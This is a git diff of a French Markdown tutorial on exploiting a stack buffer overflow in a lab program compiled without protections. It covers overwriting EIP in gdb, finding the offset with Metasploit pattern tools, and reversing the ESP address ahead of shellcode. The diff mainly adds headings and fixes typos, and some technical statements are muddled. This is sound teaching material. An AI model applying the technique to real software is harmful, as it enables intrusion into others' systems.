@@ -18,15 +18,23 @@ int main(int argc, char **argv){
 gcc -z execstack -fno-stack-protector -m32 sayHello.c -o run
 ```
 
-Avec `gdb`, envoyer un nombre de 'A' au programme 
+---
+
+**Take Controle of EIP**
+
+Avec `gdb`, envoyer un nombre important de 'A' au programme jusqu'a obtenir une erreur soit (`SIGSEGV, Segementation fault`)
 
 ```c
 (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
-Verifier que nous avons bien ecrit sur `EIP` et qu'il a les valeurs `A` soit `0x41414141`
+A partir des informations du registre `info registers`, verifier que nous avons bien écrasé sur `EIP` et qu'il a les valeurs `A` soit `0x41414141`
 
-Maintenant il faut chercher le `offset` c'est la taille exact qu'il faut pour ecrire sur `EIP`
+---
+
+**Finding the offset**
+
+Maintenant il faut chercher le `offset` c'est la taille exact qu'il faut pour écrasé sur `EIP`
 
 ```c
 msf-pattern_create -l 100
@@ -38,7 +46,7 @@ Executer la sortie de la commande dans `gdb`
 (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A...
 ```
 
-Verifier que `EIP` a une nouvelle valeur, prendre cette valeur et trouve l'`offset` 
+Verifier que `EIP` a une nouvelle valeur, prendre cette valeur et trouver l'`offset` correspondant.
 
 ```c
 msf-pattern_offset -q {EIP_VALUE}
@@ -46,7 +54,8 @@ msf-pattern_offset -q {EIP_VALUE}
 
 Ceci vas retourner une valeur qui sera la taille de note offset (`size-offset`)
 
-Donc il nous faut `size-offset` caractere suivie de notre shellcode. En gros tout ce qui se trouve au dela de la taille de notre offset vas etre executer en memoire dans `EBP`
+Donc il nous faut `size-offset` caractere suivie de notre shellcode. 
+En gros tout ce qui se trouve au dela de la taille de notre offset vas etre executer en memoire dans `EBP`
 
 En suite
 
@@ -61,6 +70,10 @@ Le programme vas planter et on verifie le registrer `ESP`
 (gdb) print $esp 
 # => 0xffffcee0
 ```
+
+---
+
+**Generating Shellcode**
 
 Il faut ecrire la valeur de ESP en envers soit `\xe0\xce\xff\xff` -> {`esp-reverse}
 
